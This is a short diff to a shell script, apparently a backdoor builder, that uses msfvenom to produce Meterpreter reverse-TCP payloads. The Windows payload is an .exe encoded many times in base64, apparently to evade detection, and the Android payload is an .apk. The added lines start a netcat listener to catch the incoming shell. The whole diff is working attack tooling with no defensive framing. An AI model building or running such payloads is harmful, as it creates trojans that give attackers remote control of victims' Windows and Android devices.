@@ -515,11 +515,27 @@ read -p 'name : ' namebd
 if [ $osbd = "windows" ] 
 then
 msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd -a x86 --encoder cmd/powershell_base64 -i 58 lport=$portbd > $namebd.exe
+echo
+echo
+echo
+echo listening in $hostbd : $portbd
+echo
+echo
+echo
+nc -nlvp $portbd
 fi
 
 if [ $osbd = "android" ]
 then
 msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd lport=$portbd > $namebd.apk
+echo
+echo
+echo
+echo listening in $hostbd : $portbd
+echo
+echo
+echo
+nc -nlvp $portbd
 fi
 
 
